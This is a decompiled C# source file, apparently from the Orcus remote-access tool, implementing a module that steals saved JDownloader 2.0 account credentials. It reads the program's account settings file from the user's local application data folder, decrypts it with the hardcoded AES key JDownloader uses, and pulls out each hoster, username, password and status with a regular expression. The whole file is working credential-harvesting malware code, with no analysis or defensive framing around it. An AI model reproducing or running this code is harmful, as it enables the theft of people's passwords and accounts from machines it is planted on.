using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text.RegularExpressions;
using Orcus.Shared.Commands.Password;

namespace Orcus.Commands.Passwords.Applications.JDownloader;

internal class JDownloader : IPasswordRecovery
{
	public IEnumerable<RecoveredPassword> GetPasswords()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0078: Unknown result type (might be due to invalid IL or missing references)
		//IL_0093: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d5: Expected O, but got Unknown
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "JDownloader v2.0\\cfg\\org.jdownloader.settings.AccountSettings.accounts.ejs");
		List<RecoveredPassword> list = new List<RecoveredPassword>();
		if (!File.Exists(text))
		{
			return list;
		}
		foreach (Match item in Regex.Matches(Decrypt(text), "\"(?<hoster>(.+?))\" : \\[\\ \\{.+?\"password\" : \"(?<password>(.*?))\".*?\"user\" : \"(?<userName>(.*?))\".*?\"statusString\" : \"(?<status>(.*?))\"", RegexOptions.Singleline))
		{
			RecoveredPassword val = new RecoveredPassword();
			val.set_Application("JDownloader 2.0");
			val.set_UserName(item.Groups["userName"].Value);
			val.set_Password(item.Groups["password"].Value);
			val.set_Field1(item.Groups["hoster"].Value);
			val.set_Field2(item.Groups["status"].Value);
			val.set_PasswordType((PasswordType)4);
			list.Add(val);
		}
		return list;
	}

	private static string Decrypt(string filePath)
	{
		byte[] buffer = File.ReadAllBytes(filePath);
		byte[] array = new sbyte[16]
		{
			1, 6, 4, 5, 2, 7, 4, 3, 12, 61,
			14, 75, -2, -7, -44, 33
		}.Select((sbyte sb) => (byte)sb).ToArray();
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.Key = array;
		aesCryptoServiceProvider.IV = array;
		ICryptoTransform transform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		using MemoryStream stream = new MemoryStream(buffer);
		using CryptoStream stream2 = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		using StreamReader streamReader = new StreamReader(stream2);
		return streamReader.ReadToEnd();
	}
}
